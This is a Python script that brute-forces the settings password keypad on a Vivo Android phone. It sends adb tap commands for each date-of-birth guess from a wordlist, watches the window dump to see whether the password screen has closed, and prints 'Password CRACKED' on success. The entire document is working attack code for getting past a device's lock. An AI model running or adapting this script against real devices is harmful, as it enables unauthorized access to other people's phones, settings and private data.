import subprocess, time

KEYS = {
    "1": (185, 1777), "2": (539, 1777), "3": (894, 1777),
    "4": (185, 1918), "5": (539, 1918), "6": (894, 1918),
    "7": (185, 2059), "8": (539, 2059), "9": (894, 2059),
    "C": (185, 2173), "0": (539, 2173), "D": (894, 2173),
}

def press(seq, delay=0.1):
    for ch in seq.upper():
        x, y = KEYS[ch]
        subprocess.run(["adb", "shell", "input", "tap", str(x), str(y)], check=True)
        time.sleep(delay)

def keypad_visible():
    out = subprocess.check_output(["adb", "shell", "dumpsys", "window"]).decode()
    return "I=com.android.settings/com.vivo.settings.secret.PasswordActivity" in out

def check_correct():
    timeout, start = 2, time.time()
    while keypad_visible():
        if time.time() - start > timeout:
            print("Password likely wrong — keypad still showing")
            return 0
        time.sleep(0.2)
    print("!!!!!!!!!!!!Password CRACKED!!!!!!!!")
    return 1

if __name__ == "__main__":
    password = list()
    #word = ""
    with open("dob_wordlist.txt",'r') as f:
        password = f.readlines()
    for i in password:
        word = i.strip()
        print("Password trying .... -> " + word)
        press(word)
        temp = check_correct()
        if temp:
            print("Password found !!!! -> "+word)
            exit(0)
        else:
            continue